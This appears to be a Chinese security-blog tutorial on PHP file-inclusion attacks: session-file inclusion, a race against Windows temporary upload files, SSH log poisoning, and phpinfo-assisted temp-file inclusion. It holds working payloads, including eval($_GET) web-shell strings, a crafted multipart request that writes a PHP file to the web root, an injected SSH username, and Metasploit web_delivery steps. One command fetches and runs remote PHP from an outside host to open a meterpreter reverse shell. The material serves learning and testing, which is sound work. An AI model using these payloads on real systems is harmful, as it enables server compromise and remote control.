&lt;li&gt;对于文件会话保存管理器，会将会话数据保存到配置项 session.save_path 所指定的位置。&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;把我们的用户名 base64 编码后放到了 session 中&lt;/p&gt;
&lt;p&gt;那么可能存在 session 包含了，session 包含的两个条件：1. 知道物理路径与 session 名称，物理路径我们是知道的，session 名称我们可以 f12 查看 2.session 可以写入并且被包含，这一点我们也是满足的&lt;/p&gt;
&lt;p&gt;这样我们可以注册的时候用户名写我们的 php 代码，然后通过 session 包含&lt;/p&gt;
&lt;p&gt;但 session 中是 base64 编码后的，不能直接包含，我们需要在包含前解码，php://filter 就是个很好的解码方法&lt;/p&gt;
&lt;p&gt;注册如下用户名： &lt;code&gt;hahaha&lt;/code&gt; ，密码随便写，最终在数据库中的是： &lt;code&gt;username|s:12:&amp;quot;xxxxxxx&amp;quot;&lt;/code&gt; xxx 为我们用户名的 base64 编码，12 是 base64 编码的长度&lt;/p&gt;
&lt;p&gt;但 base64 是有特性的他必须 8 位为一组，如果不够会把后面的字符抓过来，此时 &lt;code&gt;username|s:12:&amp;quot;&lt;/code&gt;  正好是 15 个字符，为了增加一个字符，我们需要扩展我们的用户名，让他 base64 之后为 100 字符以上，这样我们前 16 个字符被解码为乱码，我们的 php 被正确包含&lt;/p&gt;
&lt;p&gt;比如： &lt;code&gt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;lt;?php eval($_GET[&#39;aaaaaa&#39;]) ?&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;然后解码，正确包含&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://1.1.1.1/index.php?action=php://filter/read=convert.base64-decode/resource=/var/lib/php5/sess_udu8pr09fjvabtoip8icgurt85&amp;amp;aaaaaa=phpinfo();&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;防御 session：&lt;/p&gt;
&lt;p&gt;修改 session 默认路径和名称&lt;/p&gt;
&lt;p&gt;设置 session 文件夹权限&lt;/p&gt;
&lt;h2 id=&#34;临时文件包含&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#临时文件包含&#34;&gt;#&lt;/a&gt; 临时文件包含&lt;/h2&gt;
&lt;p&gt;当文件上传时，先存储到临时文件夹，在移动到网站目录下，我们可以通过竞争在删除之前包含，文件名通过通配符找到&lt;/p&gt;
&lt;p&gt;1. 先上传文件&lt;/p&gt;
&lt;p&gt;2. 通过 file 覆盖前一个文件，匹配临时文件&lt;/p&gt;
&lt;p&gt;3. 包含临时文件&lt;/p&gt;
&lt;p&gt;如果是自己的 phpstudy 默认是没有开启&lt;/p&gt;
&lt;p&gt;我们需要修改 upload_tmp_dir = “C:\Windows\Temp”&lt;/p&gt;
&lt;p&gt;然后利用文件上传产生的缓存文件进行命令执行，从而 getshell&lt;/p&gt;
&lt;p&gt;假设我们有一个前端页面可以上传文件，后端可以接收上传的文件并进行包含，那么我们就可以利用文件上传时上传到临时目录，在删除之前通过竞争包含&lt;/p&gt;
&lt;p&gt;我们需要解决几个问题：&lt;/p&gt;
&lt;p&gt;1. 如何找到我们的临时文件？&lt;/p&gt;
&lt;p&gt;通过 &amp;gt;，在 Windows 中 &amp;gt; 可以当做通配符使用，很巧，php 的临时文件长这样 php678u，那么我们可以这样匹配 php&amp;gt;&amp;gt;&amp;gt;&lt;/p&gt;
&lt;p&gt;2. 即使我们访问到临时文件，他依然会删除，怎么解决？&lt;/p&gt;
&lt;p&gt;往他网站根目录下写 php 文件，即使我们的临时文件删除了，只要在删除之前包含了，那么我们在网站根目录下的文件就会生成&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;?php fputs(fopen(&#39;E:\phpstudy_pro\www\aaaaa.php&#39;,&#39;w&#39;),&#39;&amp;lt;?php phpinfo(); ?&amp;gt;&#39;); ?&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;3. 如何构造上传包&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /xss_location/include/windows.php HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: 172.16.60.64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 481&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Cache-Control: max-age=0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Upgrade-Insecure-Requests: 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Origin: http://172.16.60.64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: multipart/form-data; boundary=----WebKitFormBoundary163SaL5Buko78Yfw&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://172.16.60.64/xss_location/include/windows.html&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Language: zh-CN,zh;q=0.9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Cookie: PHPSESSID=s3pod5ho262o336afdd8ljvkg7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;------WebKitFormBoundary163SaL5Buko78Yfw&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Disposition: form-data; name=&amp;quot;file&amp;quot;; filename=&amp;quot;flag.txt&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: text/plain&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php fputs(fopen(&amp;#x27;E:\phpstudy_pro\www\aaaaa.php&amp;#x27;,&amp;#x27;w&amp;#x27;),&amp;#x27;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;#x27;); ?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;yes&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;------WebKitFormBoundary163SaL5Buko78Yfw&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Disposition: form-data; name=&amp;quot;file&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;C:\Windows\Temp\php&amp;lt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;------WebKitFormBoundary163SaL5Buko78Yfw&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Disposition: form-data; name=&amp;quot;upload&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;upload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;------WebKitFormBoundary163SaL5Buko78Yfw--&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;注意：下面几行是需要我们自己构造的&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;yes&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;------WebKitFormBoundary163SaL5Buko78Yfw&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Disposition: form-data; name=&amp;quot;file&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;C:\Windows\Temp\php&amp;lt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;yes 的作用是包含成功后的提示符&lt;/p&gt;
&lt;p&gt;name=file 是为了覆盖上一个 name=file，然后匹配临时文件&lt;/p&gt;
&lt;p&gt;php&amp;gt;&amp;gt;&amp;gt;&amp;gt; 就是通配符了，上面解释过&lt;/p&gt;
&lt;p&gt;记得空行的问题，如果报错尝试删除或增加空行&lt;/p&gt;
&lt;p&gt;补充一下 windows 匹配&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;DOS_STAR：即 &amp;lt;，匹配 0 个以上的字符&lt;br&gt;
 DOS_QM：即 &amp;gt;，匹配 1 个字符&lt;br&gt;
 DOS_DOT：即 &amp;quot;，匹配点号&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;如果他的 php.ini 下没有设置 upload 这个东西的路径并且还有；，也就是没有设置。&lt;/p&gt;
&lt;p&gt;那么我们也可以直接读取任意文件&lt;/p&gt;
&lt;p&gt;其实也没必要非得文件上传了，本来文件包含后就可以读取了&lt;/p&gt;
&lt;p&gt;临时文件包含条件：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1.php.ini 中的 upload_tmp_dir 下必须有 C:/Windows/Temp 这个路径&lt;/p&gt;
&lt;p&gt;2. 得有写入的权限（这个默认应该都可以）&lt;/p&gt;
&lt;p&gt;3.$_REQUEST 得有，因为他是获取表单信息的一个数组，如果没有它，那么我们就不能进行文件上传来打。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;ssh文件包含&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssh文件包含&#34;&gt;#&lt;/a&gt; SSH 文件包含&lt;/h2&gt;
&lt;p&gt;假设有如下文件：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;file&amp;#x27;&lt;/span&gt;];   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;))   &amp;#123;       &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;&lt;span class=&#34;subst&#34;&gt;$file&lt;/span&gt;&amp;quot;&lt;/span&gt;);   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;   &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;   &amp;#123;       &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;index.php&amp;quot;&lt;/span&gt;);   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;那么我们就可以包含任意文件，比如 /etc/passwd&lt;/p&gt;
&lt;p&gt;&lt;code&gt;[101.35.139.208:9999/lfi.php?file=file:///etc/passwd](http://101.35.139.208:9999/lfi.php?file=file:///etc/passwd)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031191034602.png&#34; alt=&#34;image-20221031191034602&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么意味着我们其实也可以包含 ssh log&lt;/p&gt;
&lt;p&gt;先看一眼 ssh log 里面有啥&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031191351374.png&#34; alt=&#34;image-20221031191351374&#34;&gt;&lt;/p&gt;
&lt;p&gt;加入我们登录时构造这样的用户名 &lt;code&gt;ssh root&amp;lt;?php phpinfo();?&amp;gt;@101.35.139.208&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;那么在我们的 ssh log 中就会存在以下日志&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031191502317.png&#34; alt=&#34;image-20221031191502317&#34;&gt;&lt;/p&gt;
&lt;p&gt;试着包含一下？&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031191635298.png&#34; alt=&#34;image-20221031191635298&#34;&gt;&lt;/p&gt;
&lt;p&gt;但是文件很大，你忍一下&lt;/p&gt;
&lt;p&gt;记得在包含前，设置文件的权限 &lt;code&gt;chmod 775 secure&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;也可以写马，比如&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031192425893.png&#34; alt=&#34;image-20221031192425893&#34;&gt;&lt;/p&gt;
&lt;p&gt;如果报错 &lt;code&gt;system() has been disabled for security reasons &lt;/code&gt; ，无法包含，&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031192854594.png&#34; alt=&#34;image-20221031192854594&#34;&gt;&lt;/p&gt;
&lt;p&gt;把这里的 disable_function 中的你需要使用的函数去掉，重启&lt;/p&gt;
&lt;p&gt;&lt;code&gt;service php-fpm restart&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;web 传递  cs msf&lt;/p&gt;
&lt;p&gt;msf&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;use exploit/multi/script/web_delivery&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msf exploit (web_delivery)&amp;gt;set target 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msf exploit (web_delivery)&amp;gt; set payload php/meterpreter/reverse_tcp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msf exploit (web_delivery)&amp;gt; set lhost 192.168.1.123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msf exploit (web_delivery)&amp;gt;set srvport 8081&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msf exploit (web_delivery)&amp;gt;exploit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;执行 msf 给出的命令&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://10.128.50.84:18888/lfi.php?file=./shabi.php&amp;amp;cmd=php -d allow_url_fopen=true -r &amp;quot;eval(file_get_contents(&#39;http://192.168.13.133:9891/GEZgpb8cVDe&#39;, false, stream_context_create([&#39;ssl&#39;=&amp;gt;[&#39;verify_peer&#39;=&amp;gt;false,&#39;verify_peer_name&#39;=&amp;gt;false]])));&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031201754444.png&#34; alt=&#34;image-20221031201754444&#34;&gt;&lt;/p&gt;
&lt;p&gt;CS web delivery&lt;/p&gt;
&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221101145322747.png&#34; alt=&#34;image-20221101145322747&#34; style=&#34;zoom:80%;&#34; /&gt;
&lt;h2 id=&#34;包含procselfenviron&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#包含procselfenviron&#34;&gt;#&lt;/a&gt; 包含 / PROC/SELF/ENVIRON&lt;/h2&gt;
&lt;p&gt;并不能包含这东西～&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[root@VM-16-11-centos CobaltStrike4.1]# ls -al /proc/self/environ &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-r-------- 1 root root 0 Nov  1 14:56 /proc/self/environ&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;而且不能 chmod 改变权限&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[root@VM-16-11-centos CobaltStrike4.1]# chmod 755 /proc/self/environ &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod: changing permissions of ‘/proc/self/environ’: Operation not permitted&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;也不能修改特殊权限位&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[root@VM-16-11-centos CobaltStrike4.1]# lsattr /proc/self/environ &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lsattr: Inappropriate ioctl for device While reading flags on /proc/self/environ&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;关于 chattr&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[root@VM-16-11-centos lighthouse]# chattr +i 11111.exe &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[root@VM-16-11-centos lighthouse]# rm -rf 11111.exe &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rm: cannot remove ‘11111.exe’: Operation not permitted&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[root@VM-16-11-centos lighthouse]# lsattr 11111.exe &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;----i--------e-- 11111.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[root@VM-16-11-centos lighthouse]# chattr -i 11111.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[root@VM-16-11-centos lighthouse]# rm -rf 11111.exe &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;phpinfo文件包含&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#phpinfo文件包含&#34;&gt;#&lt;/a&gt; phpinfo 文件包含&lt;/h2&gt;
&lt;p&gt;php 5.x&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Configuration File (php.ini) Path	C:\Windows&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Loaded Configuration File	D:\BtSoft\php\54\php.ini&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PHP Version	5.4.45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;allow_url_fopen	On	On&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;allow_url_include	On	On&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;session.save_path	D:\BtSoft\temp\session	D:\BtSoft\temp\session&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;disable_functions	no value	no value&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_SERVER[&amp;quot;*********&amp;quot;]	C:\Windows&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEyNy4wLjAuMToxODg4OC9waHBpbmZvLnBocA==&#34;&gt;http://127.0.0.1:18888/phpinfo.php&lt;/span&gt; 我们可以向 phpinfo 中 post 参数，虽然没有接收，但会生成临时文件，我们可以利用时间竞争包含&lt;/p&gt;
&lt;p&gt;当然可以向任意 php 文件 post 文件，服务器都会将他保存到一个临时文件中，只是如果没有 phpinfo，临时文件名很难猜。然而 phpinfo 中会有文件名和路径的输出&lt;/p&gt;
